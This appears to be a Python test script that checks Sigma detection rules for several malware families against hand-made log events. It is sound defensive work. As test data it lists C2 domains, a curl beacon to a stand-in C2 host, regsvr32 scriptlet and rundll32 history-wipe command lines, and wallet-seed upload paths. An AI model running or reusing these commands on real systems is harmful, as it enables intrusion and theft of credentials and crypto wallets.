#!/usr/bin/env python3
"""Logic test for the Sigma rules in ../sigma on hand-made events (no real logs, no regression EVTX).
A tiny evaluator supports exactly the modifiers/conditions these rules use: exact, startswith, endswith,
contains, contains|all, re, 'sel', 'not', 'and', 'or', '1 of sel_*'. Needs PyYAML."""
import glob, os, re, sys
import yaml

HERE = os.path.dirname(os.path.abspath(__file__))
ok = True


def check(c, m):
    global ok
    print(('PASS ' if c else 'FAIL ') + m)
    ok &= bool(c)


FN = {'': lambda a, b: a == b, 'startswith': str.startswith, 'endswith': str.endswith, 'contains': lambda a, b: b in a}


def sel(s, ev):
    if isinstance(s, list):  # list of maps = OR
        return any(sel(x, ev) for x in s)
    for k, v in s.items():
        f, _, mod = k.partition('|')
        mod, _, quant = mod.partition('|')
        if mod == 're':  # Sigma regexes are case-sensitive: compare raw values
            hits = [re.search(str(x), str(ev.get(f, ''))) is not None for x in (v if isinstance(v, list) else [v])]
            if not any(hits):
                return False
            continue
        val = str(ev.get(f, '')).lower()
        hits = [FN[mod](val, str(x).lower()) for x in (v if isinstance(v, list) else [v])]
        if not (all(hits) if quant == 'all' else any(hits)):
            return False
    return True


def fires(rule, ev):
    d = rule['detection']; cond = d['condition']
    names = [k for k in d if k != 'condition']
    def of(m):
        pat = m.group(2).replace('*', '.*')
        vals = [str(sel(d[k], ev)) for k in names if re.fullmatch(pat, k)]
        return '(' + (' or ' if m.group(1) == '1' else ' and ').join(vals or ['False']) + ')'
    expr = re.sub(r'(1|all) of (\w+\*)', of, cond)
    expr = re.sub(r'\b(?!and\b|or\b|not\b|True\b|False\b)(\w+)\b', lambda m: str(sel(d[m.group(1)], ev)) if m.group(1) in d else m.group(1), expr)
    return eval(expr)


def load(name):
    return yaml.safe_load(open(glob.glob(os.path.join(HERE, '..', 'sigma', '*', name))[0]))


# (rule file, event, expected, label)
T = [
    ('dns_query_win_malware_revstealer_c2_domain.yml', dict(QueryName='queue.prooutlet58.website'), True, 'C2 subdomain'),
    ('dns_query_win_malware_revstealer_c2_domain.yml', dict(QueryName='prooutlet58.website'), True, 'C2 apex'),
    ('dns_query_win_malware_revstealer_c2_domain.yml', dict(QueryName='example.com'), False, 'unrelated domain'),
    ('proxy_malware_revstealer_c2_gate_uri.yml', dict(**{'c-uri': '/finsii/fahuy/buqpl.ajug'}), True, 'gate path 1'),
    ('proxy_malware_revstealer_c2_gate_uri.yml', dict(**{'c-uri': '/ojb/buqpl.ajug'}), True, 'gate path 3'),
    ('proxy_malware_revstealer_c2_gate_uri.yml', dict(**{'c-uri': '/api/health'}), False, 'unrelated path'),
    ('proxy_malware_revstealer_telegraph_dead_drop.yml', {'cs-host': 'api.telegra.ph', 'c-uri': '/getPage/Field-study-willow-atlas-11-05?return_content=false'}, True, 'metadata-only getPage'),
    ('proxy_malware_revstealer_telegraph_dead_drop.yml', {'cs-host': 'api.telegra.ph', 'c-uri': '/getPage/Some-Page-01-01?return_content=true'}, False, 'getPage with content'),
    ('proxy_malware_revstealer_telegraph_dead_drop.yml', {'cs-host': 'telegra.ph', 'c-uri': '/Some-Page-01-01'}, False, 'normal page view'),
    ('dns_query_win_malware_revstealer_polygon_rpc_non_browser.yml', dict(QueryName='polygon-bor-rpc.publicnode.com', Image='C:\\Users\\a\\AppData\\Local\\Temp\\x.exe'), True, 'non-browser process'),
    ('dns_query_win_malware_revstealer_polygon_rpc_non_browser.yml', dict(QueryName='polygon-bor-rpc.publicnode.com', Image='C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe'), False, 'browser (filtered)'),
    ('dns_query_win_malware_revstealer_polygon_rpc_non_browser.yml', dict(QueryName='example.com', Image='C:\\x.exe'), False, 'other domain'),
    ('proc_creation_win_renamed_onedrive.yml', dict(OriginalFileName='OneDrive.exe', Image='C:\\Users\\a\\Downloads\\Installer\\Installer.exe'), True, 'OneDrive renamed Installer.exe'),
    ('proc_creation_win_renamed_onedrive.yml', dict(OriginalFileName='OneDrive.exe', Image='C:\\Users\\a\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe'), False, 'genuine OneDrive.exe'),
    ('proc_creation_win_renamed_onedrive.yml', dict(OriginalFileName='cmd.exe', Image='C:\\Windows\\System32\\cmd.exe'), False, 'other binary'),
    ('image_load_win_susp_unsigned_version_dll_user_path.yml', dict(ImageLoaded='C:\\Users\\a\\Downloads\\Installer\\version.dll', Signed='false'), True, 'unsigned version.dll in Downloads'),
    ('image_load_win_susp_unsigned_version_dll_user_path.yml', dict(ImageLoaded='C:\\Windows\\System32\\version.dll', Signed='true'), False, 'System32 copy'),
    ('image_load_win_susp_unsigned_version_dll_user_path.yml', dict(ImageLoaded='C:\\Users\\a\\Downloads\\x\\version.dll', Signed='true'), False, 'signed vendor copy'),
    ('image_load_win_susp_unsigned_version_dll_user_path.yml', dict(ImageLoaded='C:\\Program Files\\Game\\version.dll', Signed='false'), False, 'documented miss: unsigned proxy in Program Files'),
    # MioLab macOS rules
    ('proc_creation_macos_malware_miolab_agent_activity.yml', dict(Image='/Users/a/.hlpr/.agnt', ParentImage='/sbin/launchd', CommandLine='/Users/a/.hlpr/.agnt'), True, 'agent binary runs'),
    ('proc_creation_macos_malware_miolab_agent_activity.yml', dict(Image='/bin/zsh', ParentImage='/Users/a/.hlpr/.agnt', CommandLine='/bin/zsh -i'), True, 'child of the agent'),
    ('proc_creation_macos_malware_miolab_agent_activity.yml', dict(Image='/usr/bin/curl', ParentImage='/bin/sh', CommandLine='curl --fail --header "Content-Type: text/plain" --data "OOzVBOVSpQSP" https://c2.example/api/agnt'), True, 'beacon command line'),
    ('proc_creation_macos_malware_miolab_agent_activity.yml', dict(Image='/usr/bin/curl', ParentImage='/bin/zsh', CommandLine='curl --fail --header "Content-Type: text/plain" --data "hello" https://example.com/api/other'), False, 'ordinary curl POST'),
    ('proc_creation_macos_malware_miolab_agent_activity.yml', dict(Image='/Applications/App.app/Contents/MacOS/App', ParentImage='/sbin/launchd', CommandLine='App'), False, 'unrelated process'),
    ('file_event_macos_malware_miolab_persistence_indicators.yml', dict(TargetFilename='/Users/a/Library/LaunchAgents/com.hlpr.agent.plist'), True, 'LaunchAgent plist'),
    ('file_event_macos_malware_miolab_persistence_indicators.yml', dict(TargetFilename='/Users/a/.hlpr/.ownrid'), True, 'staging file'),
    ('file_event_macos_malware_miolab_persistence_indicators.yml', dict(TargetFilename='/Users/a/Library/LaunchAgents/com.example.helper.plist'), False, 'other LaunchAgent'),
    ('net_dns_miolab_stealer_c2_domains.yml', dict(query='dfsjfisafosdikfos.info'), True, 'C2 apex'),
    ('net_dns_miolab_stealer_c2_domains.yml', dict(query='api.owqkoqoqoqoqoqqoqoo.info'), True, 'exfil subdomain'),
    ('net_dns_miolab_stealer_c2_domains.yml', dict(query='example.info'), False, 'unrelated domain'),
    ('proxy_malware_miolab_c2_communication.yml', {'cs-method': 'GET', 'c-uri': '/api/download/app-bundle?name=ledger-wallet&user_id=124&arch=arm64'}, True, 'wallet bundle download'),
    ('proxy_malware_miolab_c2_communication.yml', {'cs-method': 'POST', 'c-uri': '/api/agnt'}, True, 'agent beacon'),
    ('proxy_malware_miolab_c2_communication.yml', {'cs-method': 'POST', 'c-uri': '/api/trezor/seed'}, True, 'seed upload'),
    ('proxy_malware_miolab_c2_communication.yml', {'cs-method': 'GET', 'c-uri': '/api/agnt'}, False, 'GET to /api/agnt'),
    ('proxy_malware_miolab_c2_communication.yml', {'cs-method': 'GET', 'c-uri': '/api/download/app-bundle'}, False, 'download path without parameters'),
    # FluxEngine (part 2): events built from the statically recovered command lines and registry writes
    ('registry_set_malware_fluxengine_desktop_key.yml', dict(TargetObject='HKU\\S-1-5-21-1\\Software\\FluxEngine\\Desktop\\src'), True, 'src value written'),
    ('registry_set_malware_fluxengine_desktop_key.yml', dict(TargetObject='HKU\\S-1-5-21-1\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\x'), False, 'other key'),
    ('registry_set_malware_fluxengine_hwinfo_bsource_cache.yml', dict(TargetObject='HKU\\S-1-5-21-1\\Software\\HWiNFO32\\Sens\\bsource'), True, 'bsource cache'),
    ('registry_set_malware_fluxengine_hwinfo_bsource_cache.yml', dict(TargetObject='HKU\\S-1-5-21-1\\Software\\HWiNFO32\\Sens\\SensorsSM'), False, 'genuine HWiNFO value'),
    ('registry_set_malware_fluxengine_run_key_root_folder.yml', dict(TargetObject='HKU\\S-1-5-21-1\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\hswxhmql', Details='"C:\\hswxhmql\\hswxhmql.exe C:\\hswxhmql\\"'), True, 'loader Run value'),
    ('registry_set_malware_fluxengine_run_key_root_folder.yml', dict(TargetObject='HKU\\S-1-5-21-1\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDrive', Details='"C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe" /background'), False, 'ordinary Run value'),
    ('proc_creation_win_malware_fluxengine_attrib_from_autoit.yml', dict(Image='C:\\Windows\\System32\\attrib.exe', ParentImage='C:\\hswxhmql\\hswxhmql.exe'), True, 'hollowing host started'),
    ('proc_creation_win_malware_fluxengine_attrib_from_autoit.yml', dict(Image='C:\\Windows\\System32\\attrib.exe', ParentImage='C:\\Windows\\System32\\cmd.exe'), False, 'attrib from cmd'),
    ('proxy_malware_fluxengine_cloudflare_api_dead_drop.yml', {'cs-host': 'api.cloudflare.com', 'c-uri': '/client/v4/zones?per_page=1000', 'c-useragent': 'Embarcadero URI Client/1.0'}, True, 'zone listing'),
    ('proxy_malware_fluxengine_cloudflare_api_dead_drop.yml', {'cs-host': 'api.cloudflare.com', 'c-uri': '/client/v4/zones', 'c-useragent': 'curl/8.5.0'}, False, 'other client'),
    ('proxy_malware_fluxengine_stage_url_msie8_ua.yml', {'c-uri': '/d/abpod6?r=330767F45595', 'c-useragent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)'}, True, 'stage 2 request'),
    ('proxy_malware_fluxengine_stage_url_msie8_ua.yml', {'c-uri': '/d/abpod6', 'c-useragent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)'}, False, 'path without tracker'),
    ('net_connection_win_malware_fluxengine_attrib_network.yml', dict(Image='C:\\Windows\\System32\\attrib.exe', Initiated='true'), True, 'attrib connects out'),
    ('net_connection_win_malware_fluxengine_attrib_network.yml', dict(Image='C:\\Windows\\System32\\svchost.exe', Initiated='true'), False, 'other process'),
    ('proc_creation_win_malware_fluxengine_clearmytracks_from_scriptlet.yml', dict(ParentImage='C:\\Windows\\SysWOW64\\regsvr32.exe', Image='C:\\Windows\\SysWOW64\\rundll32.exe', CommandLine='rundll32 InetCpl.cpl,ClearMyTracksByProcess 8'), True, 'history wipe from scriptlet'),
    ('proc_creation_win_malware_fluxengine_clearmytracks_from_scriptlet.yml', dict(ParentImage='C:\\Windows\\explorer.exe', Image='C:\\Windows\\System32\\rundll32.exe', CommandLine='rundll32 InetCpl.cpl,ClearMyTracksByProcess 8'), False, 'user-initiated wipe'),
    ('proc_creation_win_malware_fluxengine_regsvr32_spawns_regsvr32_sct.yml', dict(ParentImage='C:\\Windows\\System32\\regsvr32.exe', Image='C:\\Windows\\System32\\regsvr32.exe', CommandLine='regsvr32 /s /n /u /i:"C:\\Users\\a\\AppData\\Local\\Temp\\k3x9a0zq.sct" scrobj.dll'), True, 'stage 2 starts stage 3'),
    ('proc_creation_win_malware_fluxengine_regsvr32_spawns_regsvr32_sct.yml', dict(ParentImage='C:\\Windows\\System32\\msiexec.exe', Image='C:\\Windows\\System32\\regsvr32.exe', CommandLine='regsvr32 /s C:\\x\\a.dll'), False, 'ordinary registration'),
    ('proc_creation_win_malware_fluxengine_renamed_autoit_root_folder.yml', dict(OriginalFileName='AutoIt3.exe', Image='C:\\hswxhmql\\hswxhmql.exe', CommandLine='"C:\\hswxhmql\\hswxhmql.exe" C:\\hswxhmql\\hswxhmql'), True, 'renamed AutoIt3 with script'),
    ('proc_creation_win_malware_fluxengine_renamed_autoit_root_folder.yml', dict(OriginalFileName='AutoIt3.exe', Image='C:\\Program Files\\AutoIt3\\AutoIt3.exe', CommandLine='"C:\\Program Files\\AutoIt3\\AutoIt3.exe" C:\\scripts\\job.au3'), False, 'installed AutoIt3'),
    ('proc_creation_win_malware_fluxengine_wscript_regsvr32_temp_sct.yml', dict(ParentImage='C:\\Windows\\System32\\wscript.exe', Image='C:\\Windows\\System32\\regsvr32.exe', CommandLine='regsvr32 /s /n /u /i:"C:\\Users\\a\\AppData\\Local\\Temp\\t481799.sct" scrobj.dll'), True, 'VBS starts stage 2'),
    ('proc_creation_win_malware_fluxengine_wscript_regsvr32_temp_sct.yml', dict(ParentImage='C:\\Windows\\System32\\wscript.exe', Image='C:\\Windows\\System32\\regsvr32.exe', CommandLine='regsvr32 /s C:\\Tools\\x.dll'), False, 'script registers a DLL'),
]
for f, ev, exp, label in T:
    check(fires(load(f), ev) == exp, f'{f.split("_malware_")[-1] if "_malware_" in f else f}: {label} -> {"fire" if exp else "silent"}')
files = {os.path.basename(p) for p in glob.glob(os.path.join(HERE, '..', 'sigma', '*', '*.yml'))}
check(files == {t[0] for t in T}, 'every rule file has at least one test event')
print('ALL CHECKS PASS' if ok else 'SOME CHECKS FAILED')
sys.exit(0 if ok else 1)
